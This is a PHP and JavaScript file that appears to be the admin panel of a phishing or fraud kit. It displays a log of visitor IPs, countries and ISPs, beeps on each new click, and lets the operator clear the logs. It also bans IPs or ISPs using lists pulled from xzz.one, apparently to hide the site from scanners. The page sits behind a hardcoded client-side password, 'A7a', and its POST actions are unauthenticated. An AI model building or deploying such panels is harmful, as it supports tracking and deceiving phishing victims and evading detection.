<?php
error_reporting(E_ERROR | E_PARSE);
if (!empty($_POST['CLS'])) {
    unlink('count.t');
    unlink('data.h');
    exit;
}
if (!empty($_POST['UPDATE'])) {
    file_put_contents('BannedIPs.json', file_get_contents('https://xzz.one/HE/Protect/IP.json'));
    file_put_contents('BannedISPs.json', file_get_contents('https://xzz.one/HE/Protect/ISP.json'));
    exit;
}
if (!empty($_POST['IP'])) {
    $BannedIPz = json_decode(file_get_contents('BannedIPs.json'), true);
    if (!in_array($_POST['IP'], $BannedIPz)) {
        $BannedIPz[] = $_POST['IP'];
        file_put_contents('BannedIPs.json', json_encode($BannedIPz));
    }
    // $link = "https://xzz.one/HE/Protect/do.php?IP=" . $_POST['IP'];
    // file_get_contents($link);
    exit;
}
if (!empty($_POST['ISP'])) {
    $BannedISPz = json_decode(file_get_contents('BannedISPs.json'), true);
    if (!in_array($_POST['ISP'], $BannedISPz)) {
        $BannedISPz[] = $_POST['ISP'];
        file_put_contents('BannedISPs.json', json_encode($BannedISPz));
    }
    // $link = "https://xzz.one/HE/Protect/do.php?ISP=" . $_POST['ISP'];
    // file_get_contents($link);
    exit;
}
?>
<!DOCTYPE html>
<html>
    <head>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>0</title>
        <style>
            input{
                width:120px;
            }
            .count {
                color: greenyellow;
            }
            .ip {
                font-weight: bolder;
                color: goldenrod;
            }
            .country {
                color: aqua;
            }
            .time {
                font-size: 10pt;
            }
            .region {
                color: yellowgreen;
            }
            .isp {
                color: aqua;
                border-right:0px;
                font-size: 10pt;
            }
            .banned {
                color: white;
                background-color: red;
            }
            .accordion {
                font-size: 11pt;
                font-family: Consolas, "Andale Mono", "Lucida Console", "Lucida Sans Typewriter", Monaco, "Courier New", "monospace";
                font-weight: bold;
                height: auto;
                margin: 0px;
                background-color: black;
                color: silver;
                padding: 4px 3px 3px 6px;
                cursor: pointer;
                width: 100%;
                text-align: left;
                transition: 0.3s;

            }

            .active, .accordion:hover {
                border: 2px solid aqua;
            }

            .panel {
                font-size: 10pt;
                font-family: Consolas, "Andale Mono", "Lucida Console", "Lucida Sans Typewriter", Monaco, "Courier New", "monospace";
                color:white;
                padding: 2px 5px 2px 5px;
                display: none;
                background-color: dimgray;
                overflow: hidden;
                border: 1px solid black;
                height:auto;
            }

            span{

                padding-right: 8px;
                border-right:1px solid gray;
            }

            .response {
                height: 100%!important;
                scroll-behavior: smooth;
                overflow: auto;
                transition: 0.5s;
            }
            #Body{

                min-width:580px;background-color:silver;
            }
        </style>
    </head>
    <body id="Body" style="display:none"
          onload="Login()">
        <nav style="position: realtive;
             top:0;
             margin:5px;">
            <input placeholder="IP" id="IP"><button onClick="BanIP()">Ban IP</button>
            <input placeholder="ISP" id="ISP" style="margin-left: 20px;"><button
                onClick="BanISP()">Ban ISP</button>
            <button style="margin-left: 10px;" onClick="CLS()">CLS LOG</button><button
                style="margin-left: 10px;" onClick="Update()">Update BANS</button>
        </nav>
        <div id="footer" class="response">
        </div>
        <script>

            var textarea = document.getElementById("footer");
            var Body = document.getElementById("Body");
            function Login() {

                var person = prompt("");
                if (person === "A7a") {
                    Body.setAttribute('style', 'display:block');
                } else {
                    Body.innerHTML = "";
                }
            }
////////

            function beep() {
                var audio = new Audio('funcs/zz.wav');
                audio.play();
            }

            function GetData() {
                var DataFile = new XMLHttpRequest();
                DataFile.open("GET", "funcs/data.h", false);
                DataFile.onreadystatechange = function () {
                    if (DataFile.readyState === 4) {
                        if (DataFile.status === 200 || DataFile.status === 0) {
                            var dataText = DataFile.responseText;
                            textarea.innerHTML = dataText;
                            window.scrollTo(0, document.body.scrollHeight);
                            var acc = document.getElementsByClassName("accordion");
                            var i;
                            for (i = 0; i < acc.length; i++) {
                                acc[i].addEventListener("click", function () {
                                    this.classList.toggle("active");
                                    var panel = this.nextElementSibling;
                                    if (panel.style.display === "block") {
                                        panel.style.display = "none";
                                    } else {
                                        panel.style.display = "block";
                                    }
                                });
                            }
                        }
                    }
                };
                DataFile.send(null);
            }

            function GetClicksCount() {
                var CountFile = new XMLHttpRequest();
                CountFile.open("GET", "funcs/count.t", false);
                CountFile.onreadystatechange = function () {
                    if (CountFile.readyState === 4) {
                        if (CountFile.status === 200 || CountFile.status === 0) {

                            var allText = parseInt(CountFile.responseText);

                            if (parseInt(document.title) !== allText) {
                                beep();
                                GetData();

                            }
                            document.title = allText;
                        }
                    }
                };
                CountFile.send(null);

            }


            setInterval(function () {
                GetClicksCount();
            }, 10000);

            //////////
            function CLS() {
                var hr = new XMLHttpRequest();
                var url = "funcs/log.php";
                var TSP = "CLS=CLS";
                hr.open("POST", url, true);
                hr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                hr.send(TSP);
                document.title = "";
                document.getElementById('footer').innerHTML = "";
            }
            function Update() {
                var hr = new XMLHttpRequest();
                var url = "funcs/log.php";
                var TSP = "UPDATE=UPDATE";
                hr.open("POST", url, true);
                hr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                hr.send(TSP);


            }
            function BanIP() {
                var hr = new XMLHttpRequest();
                var url = "funcs/log.php";
                var TSP = "IP=" + document.getElementById('IP').value;
                hr.open("POST", url, true);
                hr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                hr.send(TSP);
                document.getElementById('IP').value = "";
            }
            function BanISP() {
                var hr = new XMLHttpRequest();
                var url = "funcs/log.php";
                var TSP = "ISP=" + document.getElementById('ISP').value;
                hr.open("POST", url, true);
                hr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                hr.send(TSP);
                document.getElementById('ISP').value = "";
            }
        </script>
    </body>
</html>
